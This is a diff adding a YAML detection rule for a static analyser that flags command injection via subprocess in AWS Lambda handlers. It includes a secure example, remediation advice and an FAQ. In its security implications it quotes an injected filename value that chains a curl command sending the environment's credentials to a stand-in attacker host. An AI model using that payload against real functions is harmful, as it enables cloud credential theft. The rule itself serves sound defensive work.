@@ -1,0 +1,224 @@
+# Rule Identity
+id: PYTHON-LAMBDA-SEC-002
+name: Lambda Command Injection via subprocess
+short_description: Lambda event data flows to subprocess with shell=True or as a string command, enabling OS command injection in the Lambda execution environment.
+
+# Classification
+severity: CRITICAL
+category: aws_lambda
+language: python
+ruleset: python/aws_lambda/PYTHON-LAMBDA-SEC-002
+
+# Vulnerability Details
+cwe:
+  - id: CWE-78
+    name: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    url: https://cwe.mitre.org/data/definitions/78.html
+
+owasp:
+  - id: A03:2021
+    name: Injection
+    url: https://owasp.org/Top10/A03_2021-Injection/
+
+tags:
+  - python
+  - aws
+  - lambda
+  - command-injection
+  - subprocess
+  - shell
+  - taint-analysis
+  - inter-procedural
+  - CWE-78
+  - OWASP-A03
+
+# Author
+author:
+  name: Shivasurya
+  url: https://x.com/sshivasurya
+
+# Content
+description: |
+  This rule detects OS command injection vulnerabilities in AWS Lambda functions where
+  untrusted event data flows into subprocess module calls (subprocess.run(),
+  subprocess.call(), subprocess.Popen(), subprocess.check_output()) either as a string
+  command with shell=True or embedded in a shell command string.
+
+  Lambda functions receive input from the event dictionary populated by API Gateway,
+  SQS, SNS, S3, DynamoDB Streams, and other triggers. There is no sanitization layer
+  between the raw event payload and application code, making event fields like
+  event.get("body"), event.get("queryStringParameters"), and event["Records"][0]["body"]
+  fully attacker-controllable in public-facing deployments.
+
+  The subprocess module is safer than os.system() when used with a list argument and
+  shell=False (the default). However, two common patterns re-introduce shell injection
+  risk in Lambda handlers: passing a string to subprocess.run() with shell=True, and
+  building a command string via f-string interpolation of event data before passing it
+  to any subprocess variant. Both patterns cause the system shell to interpret
+  metacharacters in the event data. In a Lambda environment, successful injection
+  immediately grants access to the execution role's AWS credentials available in the
+  environment variables.
+
+message: "Lambda event data flows to subprocess with shell=True or as a string argument. Use a list of arguments without shell=True."
+
+security_implications:
+  - title: AWS Credential Theft via Environment Variables
+    description: |
+      Lambda execution environments expose AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,
+      and AWS_SESSION_TOKEN as environment variables. subprocess with shell=True and
+      injected event data enables an attacker to run env or read /proc/self/environ to
+      capture these credentials, then use them to call AWS APIs with the full permissions
+      of the Lambda's execution role.
+  - title: Shell Metacharacter Injection
+    description: |
+      When event data is interpolated into a shell command string, characters like ;,
+      |, `, $(), &&, and || allow an attacker to append or chain arbitrary commands.
+      For example, f"convert {event['filename']} output.jpg" with filename set to
+      "x; curl attacker.com/exfil -d $(env)" executes the curl after the convert
+      regardless of whether convert succeeds.
+  - title: Internal Network Access from VPC Lambda
+    description: |
+      Lambda functions inside a VPC can reach internal subnets not accessible from
+      the internet. Command injection can be used to probe internal IP ranges, connect
+      to private RDS endpoints, or interact with internal APIs, pivoting from the
+      Lambda entry point to protected backend infrastructure.
+  - title: Persistence via /tmp Modification
+    description: |
+      The /tmp directory persists across warm invocations of the same execution
+      environment. An attacker can write scripts or binaries to /tmp that execute on
+      subsequent invocations of the same warm environment, creating a form of
+      persistence within the execution environment's lifetime.
+
+secure_example: |
+  import subprocess
+  import re
+  import json
+
+  def lambda_handler(event, context):
+      body = json.loads(event.get('body', '{}'))
+      width = body.get('width', '')
+      height = body.get('height', '')
+      filename = body.get('filename', '')
+
+      # SECURE: Validate numeric inputs
+      try:
+          width = int(width)
+          height = int(height)
+      except (ValueError, TypeError):
+          return {'statusCode': 400, 'body': 'Invalid dimensions'}
+
+      # SECURE: Validate filename with strict regex
+      if not re.match(r'^[a-zA-Z0-9_.\-]+$', filename):
+          return {'statusCode': 400, 'body': 'Invalid filename'}
+
+      # SECURE: Use subprocess with list, no shell=True
+      result = subprocess.run(
+          ['convert', f'/tmp/{filename}', '-resize', f'{width}x{height}', f'/tmp/out_{filename}'],
+          capture_output=True,
+          text=True,
+          timeout=30
+      )
+      return {'statusCode': 200, 'body': {'success': result.returncode == 0}}
+
+recommendations:
+  - Always use subprocess with a list of arguments and shell=False (the default) to prevent the shell from interpreting metacharacters in event data.
+  - Never use shell=True when any part of the command string originates from the Lambda event dictionary.
+  - Validate all event fields against strict allowlists or regular expressions before they appear in any subprocess call.
+  - Consider replacing subprocess calls with native Python libraries via Lambda Layers to eliminate the shell attack surface entirely.
+  - Apply least-privilege IAM policies to the Lambda execution role to minimize the blast radius of successful exploitation.
+
+detection_scope: |
+  This rule performs inter-procedural taint analysis with global scope. Sources are
+  Lambda event dictionary access calls: calls("event.get"), calls("event.__getitem__"),
+  including event.get("body"), event.get("queryStringParameters"),
+  event.get("pathParameters"), and event["Records"]. Sinks are
+  calls("subprocess.run"), calls("subprocess.call"), calls("subprocess.Popen"), and
+  calls("subprocess.check_output") with tainted values in the command string argument
+  or shell=True context (tracked via .tracks(0)). Sanitizers include shlex.quote()
+  applied per-argument and strict regex validation patterns. The analysis follows taint
+  through f-strings, concatenation, and function boundaries.
+
+# References
+references:
+  - title: "CWE-78: OS Command Injection"
+    url: https://cwe.mitre.org/data/definitions/78.html
+  - title: OWASP OS Command Injection Defense Cheat Sheet
+    url: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  - title: Python subprocess Security Considerations
+    url: https://docs.python.org/3/library/subprocess.html#security-considerations
+  - title: AWS Lambda Security Best Practices
+    url: https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html
+  - title: OWASP Command Injection
+    url: https://owasp.org/www-community/attacks/Command_Injection
+  - title: AWS Lambda Execution Environment
+    url: https://docs.aws.amazon.com/lambda/latest/dg/lambda-runtime-environment.html
+
+# Compliance
+compliance:
+  - standard: CWE Top 25
+    requirement: "CWE-78 ranked #5 in 2023 Most Dangerous Software Weaknesses"
+  - standard: OWASP Top 10
+    requirement: "A03:2021 - Injection"
+  - standard: PCI DSS v4.0
+    requirement: "Requirement 6.2.4 - protect against injection attacks"
+  - standard: NIST SP 800-53
+    requirement: "SI-10: Information Input Validation"
+  - standard: AWS Security Best Practices
+    requirement: "Validate all inputs; apply least-privilege execution roles"
+
+# FAQ
+faq:
+  - question: When is subprocess safe in Lambda and when is it vulnerable?
+    answer: |
+      subprocess is safe when called with a list argument and shell=False (the default).
+      In list mode, the first element is the executable and remaining elements are
+      arguments passed directly to execve() without shell interpretation. It is
+      vulnerable when shell=True is set with any string containing event data, or when
+      a string command built from event data is passed even without explicit shell=True.
+
+  - question: Does validating the event body before parsing protect against injection?
+    answer: |
+      Validation before use is the correct approach, but it must be applied to the
+      specific fields used in subprocess calls, not just to the top-level event body.
+      A JSON body that passes schema validation may still contain injection payloads
+      in nested fields. Validate each field individually with a strict regex or
+      allowlist immediately before it is used in a subprocess call.
+
+  - question: What makes Lambda subprocess injection worse than in a traditional server?
+    answer: |
+      The execution role's temporary AWS credentials are automatically present as
+      environment variables in every Lambda invocation. Unlike a traditional server
+      where credentials must be separately stolen, a subprocess injection in Lambda
+      immediately yields cloud credentials with the full scope of the execution role.
+      These credentials can be exfiltrated in the same invocation via an outbound
+      HTTP call, giving the attacker persistent cloud access until the credentials expire.
+
+  - question: Can I use shlex.quote() and keep shell=True for complex shell pipelines?
+    answer: |
+      shlex.quote() correctly escapes a single argument for shell inclusion, but it
+      must be applied to every individual argument. Even with correct shlex.quote()
+      usage, the preferred pattern is subprocess with a list and shell=False. For
+      pipelines, use subprocess.PIPE to chain multiple subprocess calls rather than
+      using shell=True.
+
+  - question: How do I handle Lambda functions that process S3 object keys via subprocess?
+    answer: |
+      S3 object keys are attacker-controlled when the S3 bucket accepts uploads from
+      external sources. Before using an S3 key in subprocess, validate it against a
+      strict regex that only allows expected characters. Prefix the key with '--' when
+      passing it as an argument to prevent flag injection. Consider using the boto3
+      S3 client to download the object to /tmp with a sanitized local filename rather
+      than passing the raw S3 key to subprocess.
+
+# Similar Rules
+similar_rules:
+  - PYTHON-LAMBDA-SEC-001
+  - PYTHON-LAMBDA-SEC-003
+  - PYTHON-LAMBDA-SEC-004
+  - PYTHON-LAMBDA-SEC-005
+  - PYTHON-LAMBDA-SEC-006
+
+# Test Files
+tests:
+  positive: tests/positive/
+  negative: tests/negative/
